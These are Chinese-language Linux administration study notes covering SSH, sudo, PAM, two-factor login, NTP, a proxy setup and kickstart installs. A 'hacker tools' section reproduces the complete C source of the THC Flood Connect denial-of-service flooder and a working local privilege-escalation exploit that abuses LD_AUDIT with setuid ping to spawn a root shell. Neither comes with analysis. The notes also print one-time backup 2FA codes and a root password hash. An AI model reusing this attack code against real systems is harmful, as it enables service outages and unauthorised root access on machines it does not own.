[15:48:31 root@liu ~]#vim /etc/ssh/sshd_config
#优化服务器配置
UseDNS yes #提高速度可改为no
GSSAPIAuthentication yes #提高速度可改为no
#修改服务器端口号
[root@liuwp ~]# vim /etc/ssh/sshd_config
# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER
Port 1314 在这里修改端口号
[root@liuwp ~]# systemctl restart sshd
```

![1651737142253](linuxSRE.assets/1651737142253.png)

### 28.7ssh密钥登录

![1651739648823](linuxSRE.assets/1651739648823.png)

```
#1.生成公钥私钥对
[15:45:21 root@liu ~]#ssh-keygen
#2.把公钥拷贝到远程主机上，在远程主机下的.ssh下生成authorized_keys文件
#我的远程主机ip:39.99.227.252,端口号1314
[15:57:16 root@liu ~]#ssh-copy-id -i .ssh/id_rsa.pub 39.99.227.252 -p 1314
3.配置完成，可以传输文件了
[16:25:58 root@liu ~]#scp -P 1314 hello.c 39.99.227.252:~/
hello.c                                             100%   63     0.6KB/s   00:00
#还可以直接远程连接不要输入密码
[17:40:24 root@liu data]#ssh -p 1314 www.liusenbiao.cn
Last login: Thu May  5 17:21:05 2022 from 223.87.230.45

Welcome to Alibaba Cloud Elastic Compute Service !
```

![1651740270890](linuxSRE.assets/1651740270890.png)

### 28.8分配sudo权限

```
[16:42:08 root@liu ~]#vim /etc/sudoers
sudoers 授权规则格式：
#1.允许单个用户进行某些root权限
用户 登入主机=(代表用户) 命令
user host=(runas) command
#案例 让小华用户以root的身份执行mount命令
[17:26:25 xiaohua@liu ~]$which mount
/bin/mount

#2.允许单个组的所有用户进行某些root权限
#加入配置文件wheel组里想干嘛就干嘛
[18:09:01 xiaohua@liu ~]$id xiaohua
uid=1002(xiaohua) gid=1003(xiaohua) groups=1003(xiaohua)
[18:14:03 root@liu ~]#gpasswd -a xiaohua wheel
uid=1002(xiaohua) gid=1003(xiaohua) groups=1003(xiaohua),10(wheel)
#把root变成普通用户
[18:18:21 root@liu ~]#vim /etc/passwd


#3.在生产环境，一般不直接放到sudoers里面
#一般都是放在sudoers.d文件夹下
[19:10:29 root@liu ~]#vim /etc/sudoers.d/test
#xiaoming ALL=  sudoedit
[19:12:25 root@liu sudoers.d]#chmod 440 test
[19:16:08 xiaoming@liu ~]$sudoedit /etc/sudoers

#4.sudo使用别名规则
#别名必须是大写字母和数字的组合且大写字母在前
User_Alias SYSADER=wang,mage,%admins #用户名和组结合
User_Alias DISKADER=tom
Host_Alias SERS=www.magedu.com,172.16.0.0/24 #代表的主机
Runas_Alias OP=root 
Cmnd_Alias SYDCMD=/bin/chown,/bin/chmod #授权的命令
Cmnd_Alias DSKCMD=/sbin/parted,/sbin/fdisk  #授权的命令
SYSADER SERS=   SYDCMD,DSKCMD #不同的人在指定的主机登录执行指定的命令
DISKADER ALL=(OP) DSKCMD
#别名通配符写法
User_Alias ADMINUSER = adminuser1,adminuser2
Cmnd_Alias ADMINCMD = /usr/sbin/useradd，/usr/sbin/usermod, /usr/bin/passwd [a-zA-Z]*, !/usr/bin/passwd root
ADMINUSER ALL=(root) NOPASSWD:ADMINCMD，PASSWD:/usr/sbin/userdel
```

![1651829747920](linuxSRE.assets/1651829747920.png)

**这是把root变成普通用户的操作**

![1651836274442](linuxSRE.assets/1651836274442.png)

### 28.9PAM认证机制

#### 28.9.1pam_limits.so 模块

功能：在用户级别实现对其可使用的资源的限制，例如：可打开的文件数量，可运行的进程数量，可用内存空间

![1652074370676](linuxSRE.assets/1652074370676.png)

```
1：查看现在的文件描述符大小和用户最大进程数
centos7
查看全部
# ulimit -a
查看文件描述符大小，即最大打开的文件数
# ulimit -n
查看用户最大进程数大小
# ulimit -u
Centos7修改用户进程数和文件描述符
2：文件描述符大小和用户最大进程数修改，编辑配置文件
# vim /etc/security/limits.conf
* soft nproc 65535
* hard nproc 65535
* soft nofile 65535
* hard nofile 65535
liu - maxlogins 2 #限制登录的最大次数
:wq!
保存退出
Centos7修改用户进程数和文件描述符
soft nproc： 单个用户可用的最大进程数量(软限制)
hard nproc：单个用户可用的最大进程数量(硬限制)
soft nofile： 可打开的文件描述符的最大数(软限制)
hard nofile：可打开的文件描述符的最大数(硬限制)
* ：代表所有用户，也可以写成你需要修改的用户名
3：删除/etc/security/limits.d/下的文件，否则生效的为里面文件的配置
#cd /etc/security/limits.d/，这个至关重要，不然不生效！！！！
然后一定要退出当前窗口重进下，不然也不会生效！！！！！
#rm -rf 20-nproc.conf
[18:33:16 root@liu ~]#tail /var/log/secure -f #查看日志
4.生产者常见设置参考
# End of file

*                soft    core            unlimited
*                hard    core            unlimited
*                soft    nproc           1000000
*                hard    nproc           1000000
*                soft    nofile          1000000
*                hard    nofile          1000000
*                soft    memlock         32000
*                hard    memlock         32000
*                soft    msgqueue        8192000
*                hard    msgqueue        8192000

案例：限制mage用户最大的同时登录次数

```

先要注释掉/etc/security/limits.d/20-nproc.conf的文件

![1652091834481](linuxSRE.assets/1652091834481.png)

bash超过了5次就不允许了！！

![1652091967700](linuxSRE.assets/1652091967700.png)

####  28.9.2pam_google_authenticator模块

功能：实现SSH登录的两次身份验证，先验证APP的数字码，再验证root用户的密码，都通过才可以登录。目前只支持口令验证，不支持基于key验证

官方网站：https://github.com/google/google-authenticator-android

**先手机上安装app**

![1652095808490](linuxSRE.assets/1652095808490.png)

```
#1.一键安装google_authenticator脚本
#一路y结束结束,bash执行过程中在你的linux上会出现二维码
#这时候拿你手机的app扫一下进行关联
#安装epel
#yum install -y epel-release.noarch 
#yum makecache 
#安装google authenticator
yum install -y google-authenticator.x86_64
echo -e "\033[31mDo you want me to update your "/root/.google_authenticator" file? (y/n) y"
echo -e "\033[31m你希望我更新你的“/root/.google_authenticator”文件吗(y/n)？\033[0m"
echo -e "\033[31mDo you want to disallow multiple uses of the same authentication"
echo -e "\033[31mtoken? This restricts you to one login about every 30s, but it increases"
echo -e "\033[31myour chances to notice or even prevent man-in-the-middle attacks (y/n) y"
echo -e "\033[31m你希望禁止多次使用同一个验证令牌吗?这限制你每次登录的时间大约是30秒， 但是这加大了发现或甚至防止中间人攻击的可能性(y/n)?\033[0m"
echo -e "\033[31mBy default, a new token is generated every 30 seconds by the mobile app."
echo -e "\033[31mIn order to compensate for possible time-skew between the client and the server,"
echo -e "\033[31mwe allow an extra token before and after the current time. This allows for a"
echo -e "\033[31mtime skew of up to 30 seconds between authentication server and client. If you"
echo -e "\033[31mexperience problems with poor time synchronization, you can increase the window"
echo -e "\033[31mfrom its default size of 3 permitted codes (one previous code, the current"
echo -e "\033[31mcode, the next code) to 17 permitted codes (the 8 previous codes, the current"
echo -e "\033[31mcode, and the 8 next codes). This will permit for a time skew of up to 4 minutes"
echo -e "\033[31mbetween client and server."
echo -e "\033[31mDo you want to do so? (y/n) y"
echo -e "\033[31m默认情况下，令牌保持30秒有效;为了补偿客户机与服务器之间可能存在的时滞，\033[0m"
echo -e "\033[31m我们允许在当前时间前后有一个额外令牌。如果你在时间同步方面遇到了问题， 可以增加窗口从默认的3个可通过验证码增加到17个可通过验证码，\033[0m"
echo -e "\033[31m这将允许客户机与服务器之间的时差增加到4分钟。你希望这么做吗(y/n)?\033[0m"
echo -e "\033[31mIf the computer that you are logging into isn't hardened against brute-force"
echo -e "\033[31mlogin attempts, you can enable rate-limiting for the authentication module."
echo -e "\033[31mBy default, this limits attackers to no more than 3 login attempts every 30s."
echo -e "\033[31mDo you want to enable rate-limiting? (y/n) y"
echo -e "\033[31m如果你登录的那台计算机没有经过固化，以防范运用蛮力的登录企图，可以对验证模块\033[0m"
echo -e "\033[31m启用尝试次数限制。默认情况下，这限制攻击者每30秒试图登录的次数只有3次。 你希望启用尝试次数限制吗(y/n)?\033[0m"
echo -e "\033[32m 在App Store 搜索Google Authenticator 进行App安装 \033[0m"

google-authenticator

#/etc/pam.d/sshd文件，修改或添加下行保存
#auth required pam_google_authenticator.so
sed -i '1a\auth       required     pam_google_authenticator.so' /etc/pam.d/sshd
#编辑/etc/ssh/sshd_config找到下行
#ChallengeResponseAuthentication no
#更改为
#ChallengeResponseAuthentication yes
sed -i 's/.*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config

#重启SSH服务
service sshd restart

#2.若是手机丢了 可以通过里卖弄的code找回
[19:30:40 root@liu ~]#cat .google_authenticator
82374759  #只要ssh的时候输入这个就行了，这是一次性的！
89370041
77878035
21595878
22133559 
[19:30:40 root@liu ~]#vim .google_authenticator #也可以自己随便写

#3.基于ssh key验证
[19:30:40 root@liu ~]#vim /etc/ssh/sshd_config
#在最后一行加下面内容
AuthenticationMethods publickey,keyboard-interactive
[19:30:40 root@liu ~]#vim /etc/pam.d/sshd
#注释此行
#auth  substack  password-auth
[19:30:40 root@liu ~]#systemctl restart sshd
```

![1652098613289](linuxSRE.assets/1652098613289.png)

### 28.10搭建NTP Server

![1652109113173](linuxSRE.assets/1652109113173.png)

```
#1.服务器端
#修改chrony.conf配置文件
[23:07:38 root@liu ~]#yum -y install chrony #先安装包
[23:07:38 root@liu ~]#systemctl start chronyd #启动服务
[23:07:38 root@liu ~]#timedatectl set-timezone "Asia/Shanghai"
[23:07:38 root@liu ~]#vim /etc/chrony.conf
# Use public servers from the pool.ntp.org project.
# Please consider joining the pool (http://www.pool.ntp.org/join.html).
server ntp.aliyun.com iburst #配置阿里NTP服务器
server ntp1.aliyun.com iburst
server ntp2.aliyun.com iburst

Allow NTP client access from local network.
#allow 192.168.0.0/16
allow 0.0.0.0/0 #加上这一行表示任意主机可以连接

# Serve time even if not synchronized to a time source.
#local stratum 10 #这个注释打开 表示当互联网无法连接时候，仍然可以为客户端进行时间同步
[23:24:06 root@liu ~]# systemctl restart chronyd
#验证是否同步成功
[23:27:55 root@liu ~]#chronyc sources -v
210 Number of sources = 2

  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.
 / .- Source state '*' = current synced, '+' = combined , '-' = not combined,
| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.
||                                                 .- xxxx [ yyyy ] +/- zzzz
||      Reachability register (octal) -.           |  xxxx = adjusted offset,
||      Log2(Polling interval) --.      |          |  yyyy = measured offset,
||                                \     |          |  zzzz = estimated error.
||                                 |    |           \
MS Name/IP address         Stratum Poll Reach LastRx Last sample               
===============================================================================
^* 203.107.6.88                  2   6   177    28   +335us[ +8760h] +/-   36ms
^? 120.25.115.20                 2   6   137    91   -103us[ +8760h] +/-   22ms
其中'?' = unreachable表示不成功，如果有*则表示成功

#2.客户端
#让别的服务器指向配置的NTP服务器
#拿别的机器指向当时配置NTP的机器,我用的是自己的阿里云服务器
#显然拿阿里云服务器是ping不通的，会出现no server suitable for synchronization found的错误，究极原因就是广域网是不可能ping的通局域网ip的，所以要想做实验，必须实验的两个主机是同一个网段
[root@liuwp ~]# vim /etc/chrony.conf
server 10.0.0.8 iburst #指向自己的服务器
[root@liuwp ~]# date -s '-2 year' #故意改错时间实验
[root@liuwp ~]# systemctl restart chronyd.service
[root@liuwp ~]# ntpdate 10.0.0.8 #敲这个命令进行时间同步
[root@liuwp ~]# cat /var/log/messages
```

![1652148919148](linuxSRE.assets/1652148919148.png)

## 29.黑客工具

### 29.1泛洪攻击

```
/*
 * Flood Connecter v2.1 (c) 2003-2005 by van Hauser / THC <vh@thc.org>
 * http://www.thc.org
 *
 * Connection flooder, can also send data, keep connections open etc.
 *
 * Changes:
 *		2.1 Small enhancements and bugfixes
 *		2.0 added slow send options (-w/-W), very powerful!
 *		1.4 initial public release
 *
 * Use allowed only for legal purposes.
 *
 * To compile:   cc -o flood_connect -O2 flood_connect.c
 * with openssl: cc -o flood_connect -O2 flood_connect.c -DOPENSSL -lssl
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PORT         80    // change this if you want
#define UNLIMITED    0     // dont change this
#define MAX_SOCKETS  65536 // change this if you want to
#define MAXFORKS     10240

#ifdef OPENSSL
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 SSL     *ssl = NULL;
 SSL_CTX *sslContext = NULL;
 RSA     *rsa = NULL;

 RSA *ssl_temp_rsa_cb(SSL *ssl, int export, int keylength) {
    if (rsa == NULL)
        rsa = RSA_generate_key(512, RSA_F4, NULL, NULL);
    return rsa;
 }
#endif

typedef struct {
    int socket;
#ifdef OPENSSL
    SSL *ssl;
#endif
    int where;
} socket_struct;

char *prg;
int   verbose = 0;
int   forks = 0;
int   pids[MAXFORKS];
int   warn = 0;
socket_struct sockets[MAX_SOCKETS];
time_t last_send = 0;
int   send_delay = 0;
int   send_amount = 0;
int   use_ssl = 0;
char *str = NULL;
int   str_len = 0;
unsigned long int count = 0, successful = 0;

void help() {
    printf("Flood Connect v2.0 (c) 2003 by van Hauser/THC <vh@thc.org> http://www.thc.org\n");
    printf("Syntax: %s [-S] [-u] [-p port] [-i file] [-n connects] [-N delay] [-c] [-C delay] [-d] [-D delay] [-w bytes] [-W delay] [-e] [-k] [-v] TARGET\n", prg);
    printf("Options:\n");
    printf("    -S           use SSL after TCP connect (not with -u, sets default port=443)\n");
    printf("    -u           use UDP protocol (default: TCP) (not usable with -c and -S)\n");
    printf("    -p port      port to connect to (default: %d)\n", PORT);
    printf("    -f forks     number of forks to additionally spawn (default: 0)\n");
    printf("    -i file      data to send to the port (default: none)\n");
    printf("    -n connects  maximum number of connects (default: unlimited)\n");
    printf("    -N delay     delay in ms between connects  (default: 0)\n");
    printf("    -c           close after connect (and sending data, if used with -i)\n");
    printf("                  use twice to shutdown SSL sessions hard (-S -c -c)\n");
    printf("    -C delay     delay in ms before closing the port (use with -c) (default: 0)\n");
    printf("    -d           dump data read from server\n");
    printf("    -D delay     delay in ms before read+dump data (-d) from server (default: 0)\n");
    printf("    -w bytes     amount of data from -i to send at one time (default: all)\n");
    printf("    -W delay     delay in seconds between sends, required by -w option\n");
    printf("    -e           stop when no more connects possible (default: retry forever)\n");
    printf("    -k           no keep-alive after finnishing with connects - terminate!\n");
    printf("    -v           verbose mode\n");
    printf("    TARGET       target to flood attack (ip or dns)\n");
    printf("Connection flooder. Nothing more to say. Use only allowed for legal purposes.\n");
    exit(-1);
}

void kill_children(int signo) {
    int i = 0;
    printf("Aborted (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
    while (i < forks) {
        kill(pids[i], SIGTERM);
        i++;
    }
    usleep(10000);
    i = 0;
    while (i < forks) {
        kill(pids[i], SIGKILL);
        i++;
    }
    exit(-1);
}

void killed_children(int signo) {
    int i = 0;
    if (verbose) {
      printf("Killed (made %ld successful connects)\n", successful);
    }
    exit(0);
}

void resend() {
    int i = 0, send = send_amount;
    
    if (last_send + send_delay > time(NULL))
        return;
    last_send = time(NULL);

    for (i = 0; i < MAX_SOCKETS; i++) {
        if (sockets[i].socket >= 0) {
            if (sockets[i].where < str_len) {
                if (sockets[i].where + send > str_len)
                    send = str_len - sockets[i].where;
                if (use_ssl) {
#ifdef OPENSSL
                    SSL_write(sockets[i].ssl, str + sockets[i].where, send);
#endif
                } else {
                    write(sockets[i].socket, str + sockets[i].where, send);
                }
                sockets[i].where += send;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    unsigned short int  port = PORT;
    long int max_connects = UNLIMITED;
    int      close_connection = 0;
    int      exit_on_sock_error = 0;
    int      keep_alive = 1;
    int      debug = 0;
    int      dump = 0;
    long int connect_delay = 0, close_delay = 0, dump_delay = 0;
    char    *infile = NULL;
    struct   stat st;
    FILE    *f = NULL;
    int      i;
    int      s;
    int      ret;
    int      err;
    int      client = 0;
    int      reads = 0;
    int      sock_type = SOCK_STREAM;
    int      sock_protocol = IPPROTO_TCP;
    char     buf[8196];
    struct sockaddr_in target;
    struct hostent    *resolv;
    struct rlimit      rlim;
    int      pidcount = 0, res = 0;

    prg = argv[0];
    err = 0;
    memset(sockets, 0, sizeof(sockets));
    for (i = 0; i < MAX_SOCKETS; i++)
        sockets[i].socket = -1;

    if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
        help();

    while ((i = getopt(argc, argv, "cf:C:dD:N:ei:kn:p:SuvVw:W:")) >= 0) {
        switch (i) {
            case 'c': close_connection++; break;
            case 'f': forks = atoi(optarg); break;
            case 'N': connect_delay = atol(optarg); break;
            case 'C': close_delay = atol(optarg); break;
            case 'D': dump_delay = atol(optarg); break;
            case 'W': send_delay = atoi(optarg); break;
            case 'w': send_amount = atoi(optarg); break;
            case 'd': dump = 1; break;
            case 'e': exit_on_sock_error = 1; break;
            case 'u': sock_type = SOCK_DGRAM;
                      sock_protocol = IPPROTO_UDP;
                      break;
            case 'v': verbose = 1; break;
            case 'V': debug = 1; break;
            case 'i': infile = optarg; break;
            case 'k': keep_alive = 0; break;
            case 'n': max_connects = atol(optarg); break;
            case 'S': use_ssl = 1;
                      if (port == PORT)
                          port = 443;
#ifndef OPENSSL
                      fprintf(stderr, "Error: Not compiled with openssl support, use -DOPENSSL -lssl\n");
                      exit(-1);
#endif
                      break;
            case 'p': if (atoi(optarg) < 1 || atoi(optarg) > 65535) {
                          fprintf(stderr, "Error: port must be between 1 and 65535\n");
                          exit(-1);
                      }
                      port = atoi(optarg) % 65536;
                      break;
            default: fprintf(stderr,"Error: unknown option -%c\n", i); help();
        }
    }

    if (optind + 1 != argc) {
        fprintf(stderr, "Error: target missing or too many commandline options!\n");
        exit(-1);
    }
    
    if ((send_amount || send_delay) && ! (send_amount && send_delay) ) {
        fprintf(stderr, "Error: you must specify both -w and -W options together!\n");
        exit(-1);
    }

    if (close_connection && send_delay) {
        fprintf(stderr, "Error: you can not use -c and -w/-W options together!\n");
        exit(-1);
    }

    if (forks > MAXFORKS) {
        fprintf(stderr, "Error: Maximum number of pids is %d, edit code and recompile\n", MAXFORKS);
        exit(-1);
    }

    if (infile != NULL) {
        if ((f = fopen(infile, "r")) == NULL) {
            fprintf(stderr, "Error: can not find file %s\n", infile);
            exit(-1);
        }
        fstat(fileno(f), &st);
        str_len = (int) st.st_size;
        str = malloc(str_len);
        fread(str, str_len, 1, f);
        fclose(f);
    }

    if ((resolv = gethostbyname(argv[argc-1])) == NULL) {
        fprintf(stderr, "Error: can not resolve target\n");
        exit(-1);
    }
    memset(&target, 0, sizeof(target));
    memcpy(&target.sin_addr.s_addr, resolv->h_addr, 4);
    target.sin_port = htons(port);
    target.sin_family = AF_INET;

    if (connect_delay > 0)
        connect_delay = connect_delay * 1000; /* ms to microseconds */
    else
        connect_delay = 1;
    if (close_delay > 0)
        close_delay = close_delay * 1000; /* ms to microseconds */
    else
        close_delay = 1;
    if (dump_delay > 0)
        dump_delay = dump_delay * 1000; /* ms to microseconds */
    else
        dump_delay = 1;

    rlim.rlim_cur = MAXFORKS + 1;
    rlim.rlim_max = MAXFORKS + 2;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
#ifndef RLIMIT_NOFILE
 #ifdef RLIMIT_OFILE
   #define RLIMIT_NOFILE RLIMIT_OFILE
 #endif
#endif
    rlim.rlim_cur = 60000;
    rlim.rlim_max = 60001;
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    if (verbose) {
        if (ret == 0)
            printf("setrlimit for unlimited filedescriptors succeeded.\n");
        else
            printf("setrlimit for unlimited filedescriptors failed.\n");
    }

    for (i = 3; i < 4096; i++)
        close(i);

    printf("Starting flood connect attack on %s port %d\n", inet_ntoa((struct in_addr)target.sin_addr), port);
    (void) setvbuf(stdout, NULL, _IONBF, 0);
    if (verbose)
        printf("Writing a \".\" for every 100 connect attempts\n");

    ret = 0;
    count = 0;
    successful = 0;
    i = 1;
    s = -1;
    res = 1;

    while(pidcount < forks && res != 0) {
        res = pids[pidcount] = fork();
        pidcount++;
    }

    if (res == 0) {
        client = 1;
        signal(SIGTERM, killed_children);
    }
        
    if (res != 0) {
        if (verbose && pidcount > 0)
          printf("Spawned %d clients\n", pidcount);
        signal(SIGTERM, kill_children);
        signal(SIGINT, kill_children);
        signal(SIGSEGV, kill_children);
        signal(SIGHUP, kill_children);
    }

    if (use_ssl) {
#ifdef OPENSSL
        SSL_load_error_strings();
        SSLeay_add_ssl_algorithms();

        // context: ssl2 + ssl3 is allowed, whatever the server demands
        if ((sslContext = SSL_CTX_new(SSLv23_method())) == NULL) {
            if (verbose) {
                err = ERR_get_error();
                fprintf(stderr, "SSL: Error allocating context: %s\n", ERR_error_string(err, NULL));
            }
            res = -1;
        }

        // set the compatbility mode
        SSL_CTX_set_options(sslContext, SSL_OP_ALL);

        // we set the default verifiers and dont care for the results
        (void) SSL_CTX_set_default_verify_paths(sslContext);
        SSL_CTX_set_tmp_rsa_callback(sslContext, ssl_temp_rsa_cb);
        SSL_CTX_set_verify(sslContext, SSL_VERIFY_NONE, NULL);
#endif
    }

    while (count < max_connects || max_connects == UNLIMITED) {
        if (ret >= 0) {
            if ((s = socket(AF_INET, sock_type, sock_protocol)) < 0) {
                if (verbose && warn == 0) {
                    perror("Warning (socket)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            } else {
               setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
            }
        }
        if (s >= 0) {
            ret = connect(s, (struct sockaddr *)&target, sizeof(target));
            if (use_ssl && ret >= 0) {
#ifdef OPENSSL
                if ((ssl = SSL_new(sslContext)) == NULL) {
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Error preparing an SSL context: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                } else
                    SSL_set_fd(ssl, s);
                if (ret >= 0 && SSL_connect(ssl) <= 0) {
                    printf("ERROR %d\n", SSL_connect(ssl));
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Could not create an SSL session: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                }

                if (debug)
                    fprintf(stderr, "SSL negotiated cipher: %s\n", SSL_get_cipher(ssl));
#endif
            }
            count++;
            if (ret >= 0) {
                successful++;
                warn = 0;
                if (str_len > 0) {
                    sockets[s].socket = s;
                    sockets[s].where = 0;
#ifdef OPENSSL
                    sockets[s].ssl = ssl;
#endif
                    if (! use_ssl)
                        if (setsockopt(s, SOL_TCP, TCP_NODELAY, &i, sizeof(i)) != 0)
                            perror("Warning (setsockopt SOL_TCP)");
                    if (send_delay > 0) {
                        resend();
                    } else {
                        if (use_ssl) {
#ifdef OPENSSL
                            SSL_write(ssl, str, str_len);
#endif
                        } else {
                            write(s, str, str_len);
                        }
                    }
                }
                if (dump) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    if (dump_delay > 0)
                        usleep(dump_delay);
                    if (use_ssl) {
#ifdef OPENSSL
                        reads = SSL_read(ssl, buf, sizeof(buf));
#endif
                    } else {
                        reads = read(s, buf, sizeof(buf));
                    }
                    if (reads > 0)
                        printf("DATA: %s\n", buf);
                    if (send_delay > 0)
                        resend();
                }
                if (close_connection) {
                    if (close_delay > 0)
                        usleep(close_delay);
#ifdef OPENSSL
                    if (use_ssl && close_connection == 1)
                        SSL_shutdown(ssl);
#endif
                    close(s);
#ifdef OPENSSL
                    if (use_ssl && close_connection > 1)
                        SSL_shutdown(ssl);
#endif
                }
                if (connect_delay > 0)
                    usleep(connect_delay);
            } else {
                if (verbose && warn == 0) {
                    perror("Warning (connect)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            }
            if (verbose)
                if (count % 100 == 0)
                    printf(".");
            if (send_delay > 0)
                resend();
        } else
            close(s);
    }
    if (client) {
        while (1) {}
    } else {
        if (verbose)
            printf("\n");
        printf("Done (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
        if (send_delay) {
            int end = 0;
            printf("Still sending data ...\n");
            while(! end) {
                resend();
                sleep(send_delay);
                end = 1;
                for (i = 0; i < MAX_SOCKETS; i++)
                    if (sockets[i].socket >= 0 && sockets[i].where < str_len)
                        end = 0;
            }
        }
        if (keep_alive && close_connection == 0) {
            printf("Press <ENTER> to terminate connections and this program\n");
            (void) getc(stdin);
        }
    
	if (forks > 0) {
	    usleep(1 + connect_delay + dump_delay + close_delay);
            while (i < forks) {
                kill(pids[i], SIGTERM);
                i++;
            }
	    usleep(10000);
	    i = 0;
            while (i < forks) {
                kill(pids[i], SIGKILL);
                i++;
            }
        }
    }
    return 0;
}

```

### 29.2提升权限

```
mkdir /tmp/wang
ln /bin/ping /tmp/wang/test
exec 3< /tmp/wang/test
rm -rf /tmp/wang
cat > /tmp/wang.c <<eof
void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
eof

gcc -w -fPIC -shared -o /tmp/wang /tmp/wang.c
LD_AUDIT="$ORIGIN" exec /proc/self/fd/3 &> /dev/null

```

## 30.v2rayN科学上网

```
Vultr注册链接：https://www.vultr.com/?ref=8753714
VPS服务器系统选择：ubuntu
服务器购买说明（翻墙打开）：https://github.com/eujc/v2ray/releases/tag/VPS
科学软件下载：https://bit.ly/2MXgZ4U
宝塔内网打开命令: /etc/init.d/bt default
---------------------------------------------------------
#0.宝塔意见安装脚本
#centos
yum install -y wget && wget -O install.sh http://download.bt.cn/install/install_6.0.sh && sh install.sh ed8484bec
#ubuntu
wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh && sudo bash install.sh ed8484bec

#宝塔一键卸载
wget http://download.bt.cn/install/bt-uninstall.sh
sh bt-uninstall.sh

#1.更新系统
apt|yum update -y 
apt|yum install -y curl
apt| install -y socat

#2.安装脚本
curl https://get.acme.sh | sh
~/.acme.sh/acme.sh --register-account -m 1805336068@qq.com

#3.放行80端口
iptables -I INPUT -p tcp --dport 80 -j ACCEPT

#4.申请证书
~/.acme.sh/acme.sh  --issue -d www.liusenbiao.com   --standalone
~/.acme.sh/acme.sh --installcert -d www.liusenbiao.com --key-file /root/private.key --fullchain-file /root/cert.crt

#5.Xray一键代码
bash <(curl -Ls https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh)
#6.放行端口
iptables -I INPUT -p tcp --dport 54321 -j ACCEPT
iptables -I INPUT -p tcp --dport 443 -j ACCEPT

#7.在浏览器上输入你的服务器的ip+Xray的设置的端口号
#进入控制面板
```

![1651807198193](linuxSRE.assets/1651807198193.png)

![1651807483887](linuxSRE.assets/1651807483887.png)

![1651807589357](linuxSRE.assets/1651807589357.png)

![1651807619246](linuxSRE.assets/1651807619246.png)

## 31.自动化运维

### 31.1系统部署

#### 31.1.1安装kickstart文件(半自动化)

```
#1.安装kickstart相对应的包
[17:45:17 root@liu ~]#yum -y install system-config-kickstart
#10.0.0.1是你的windows的VMnet8的ipv4地址
#0.0是你的Xmanager-Passive的地址
[18:22:46 root@liu ~]#export DISPLAY=10.0.0.1:0.0
#这个时候你的Xshell会弹出一个对话框
[18:23:23 root@liu ~]#system-config-kickstart

#2.搭建Yum仓库
[18:38:23 root@liu ~]#mkdir /var/www/html/centos/{7,8}/os/x86_64 -pv
[18:41:47 root@liu ~]#mount /dev/sr0 /var/www/html/centos/8/os/x86_64/
```

**这个是kickstart可视化界面**

![1652179653633](linuxSRE.assets/1652179653633.png)

**搭建私有Yum仓库**

![1652179811670](linuxSRE.assets/1652179811670.png)

![1652185445196](linuxSRE.assets/1652185445196.png)

**创建分区信息**

![1652185660534](linuxSRE.assets/1652185660534.png)

**网卡添加**

![1652185765827](linuxSRE.assets/1652185765827.png)

**禁用防火墙**

![1652185841256](linuxSRE.assets/1652185841256.png)

**保存家目录**

**是因为Package Selection没出来，所以要先保存在手动配置**

![1652185924134](linuxSRE.assets/1652185924134.png)

```
[20:32:30 root@liu ~]#vim /etc/yum.repos.d/base.repo
```

![1652186216197](linuxSRE.assets/1652186216197.png)

**选择你需要安装的包**

![1652186894994](linuxSRE.assets/1652186894994.png)

```
这些东西都配置完成以后，保存到根目录，然后退出开始编写安装后脚本
[20:47:22 root@liu ~]#vim ks7.cfg
#下面写的是安装以后自动完成的脚本
#分别是搭建epel源和创建linux44账号
#centos7的应答文件
#只能创建centos7的虚拟机才能成功安装
#platform=x86, AMD64, or Intel EM64T
#version=DEVEL
# Install OS instead of upgrade
install
# Keyboard layouts
keyboard 'us'
# Root password
rootpw --iscrypted $1$PzisIaYn$YwYiXKZxnHO5V0RYvli.A/
# System language
lang en_US
# System authorization information
auth  --useshadow  --passalgo=sha512
# Use text mode install
text
firstboot --disable
# SELinux configuration
selinux --disabled


# Firewall configuration
firewall --disabled
# Network information
network  --bootproto=dhcp --device=eth0
# Reboot after installation
reboot
# System timezone
timezone Africa/Abidjan
# Use network installation
url --url="http://10.0.0.7/centos/7/os/x86_64/"
# System bootloader configuration
bootloader --append="net.ifnames=0" --location=mbr
# Clear the Master Boot Record
zerombr
# Partition clearing information
clearpart --all --initlabel
# Disk partitioning information
part /boot --fstype="xfs" --ondisk=sda --size=1024
part swap --fstype="swap" --ondisk=sda --size=4096
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200

%post
mkdir /etc/yum.repos.d/bak
mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/bak
cat > /etc/yum.repos.d/base.repo <<EOF
[base]
name=CentOS
baseurl=file:///misc/cd
        https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
        https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
